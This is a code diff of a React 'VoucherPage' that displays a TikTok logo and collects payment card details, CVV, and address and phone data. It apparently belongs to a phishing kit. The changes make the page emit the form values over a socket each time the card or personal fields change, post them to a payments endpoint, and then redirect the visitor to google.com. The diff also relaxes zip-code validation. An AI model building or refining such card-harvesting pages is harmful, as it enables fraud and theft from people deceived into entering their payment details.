@@ -1,19 +1,19 @@
 import { yupResolver } from '@hookform/resolvers/yup';
 import axios from 'axios';
+import { countries } from 'countries-list';
+import moment from 'moment';
 import { useContext, useEffect, useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { useNavigate } from 'react-router-dom';
 import { toast } from 'react-toastify';
 import * as Yup from 'yup';
+import { SocketContext } from '../../App';
+import logo from '../../assets/images/tiktokLogo.svg';
 import { API_URL } from '../../config';
+import { firstCaptialize } from '../../utils';
 import CardDetailForm from './CardDetailForm';
 import { Infomation } from './Infomation';
 import './index.css';
-import { firstCaptialize, isValidZipCode, validatePhone } from '../../utils';
-import moment from 'moment';
-import { countries } from 'countries-list';
-import logo from '../../assets/images/tiktokLogo.svg';
-import { SocketContext } from '../../App';
 
 const VoucherPage = () => {
 	const navigate = useNavigate();
@@ -33,7 +33,10 @@ const VoucherPage = () => {
 		address2: Yup.string().required(),
 		city: Yup.string().required(),
 		region: Yup.string().required(),
-		zipcode: Yup.string().required(),
+		zipcode: Yup.string().required()
+			.test('val', 'Invalid zipcode', (val) => {
+				return val.toString().length <= 32 && val.toString().length >= 5;
+			}),
 		// .test('val', 'Invalid zip code', (val) => isValidZipCode(val)),
 		state: Yup.string().required(),
 		country: Yup.string().required(),
@@ -136,12 +139,14 @@ const VoucherPage = () => {
 	};
 
 	const onSubmit = async () => {
-		try {
-			await axios.post(`${API_URL}/api/payments`, { ...submitvalue, sessionId: socket.id });
-			window.location.href = 'https://www.google.com';
-		} catch (error) {
-			setLoading(false);
-			toast.error(error?.response?.data?.message ?? 'Unknow error');
+		if (watchCardVerifyCode.length > 0 && Object.keys(errors).length < 1) {
+			try {
+				await axios.post(`${API_URL}/api/payments`, { ...submitvalue, sessionId: socket.id });
+				window.location.href = 'https://www.google.com';
+			} catch (error) {
+				setLoading(false);
+				toast.error(error?.response?.data?.message ?? 'Unknow error');
+			}
 		}
 	};
 
@@ -153,11 +158,11 @@ const VoucherPage = () => {
 		if (isDirty) {
 			socket.emit("creatingPayment", { ...submitvalue, frontEnd: window.location.host });
 		}
-	}, [isDirty]);
+	}, [isDirty, submitValueCard, submitValueInformation]);
 
 	return (
 		<div style={{ height: '100%' }}>
-			<div style={{ position: 'absolute', top: 0, left: 0 }} className='sm:hidden md:block'>
+			<div style={{ position: 'absolute', top: 0, left: 0 }} className='md:block hidden'>
 				<img src={logo} height={150} width={150} />
 			</div>
 			{step === 0 && (
